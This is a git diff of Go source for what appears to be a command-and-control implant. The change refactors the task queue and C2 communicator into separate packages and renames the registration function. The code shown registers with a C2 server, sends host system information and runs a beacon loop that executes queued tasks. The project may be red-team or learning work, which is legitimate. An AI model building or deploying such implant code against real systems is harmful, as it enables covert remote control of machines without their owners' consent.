@@ -1,6 +1,8 @@
 package main
 
 import (
+	"asritha.dev/implant/pkg/c2communicator"
+	"asritha.dev/implant/pkg/task"
 	"bytes"
 	"encoding/json"
 	"fmt"
@@ -20,24 +22,24 @@ type Implant struct {
 	ID     uint           `json:"id"`
 	Config *ImplantConfig `json:"config"`
 	SystemInfo
-	TaskQueue *TaskQueue
-	Results   []Result
-	C2Communicator
+	TaskQueue *task.TaskQueue
+	Results   []task.Result
+	c2communicator.C2Communicator
 }
 
 // NewImplant instantiates an Implant, registers it, and wires up its communicator.
 func NewImplant() (*Implant, error) {
 	impl := &Implant{
 		SystemInfo: GetSystemInfo(),
-		TaskQueue:  NewTaskQueue(),
+		TaskQueue:  task.NewTaskQueue(),
 	}
 
-	protocol, err := impl.new()
+	protocol, err := impl.register()
 	if err != nil {
 		return nil, fmt.Errorf("implant registration failed: %w", err)
 	}
 
-	comm, err := NewC2Communicator(protocol)
+	comm, err := c2communicator.New(protocol)
 	if err != nil {
 		return nil, err
 	}
@@ -46,8 +48,8 @@ func NewImplant() (*Implant, error) {
 	return impl, nil
 }
 
-// register contacts the /new, fills impl.ID, and returns the c2's chosen communication protocol
-func (i *Implant) new() (string, error) {
+// register contacts the /register, fills impl.ID, and returns the c2's chosen communication protocol
+func (i *Implant) register() (string, error) {
 	const endpoint = C2HTTPSURI + C2REGISTERENDPOINT
 
 	body, err := json.Marshal(i)
@@ -120,7 +122,7 @@ func (i *Implant) BeaconLoop() error {
 		if err != nil {
 			return nil
 		}
-		i.Results = make([]Result, 0) // flush old results
+		i.Results = make([]task.Result, 0) // flush old results
 		i.ExecuteTasks()
 	}
 }
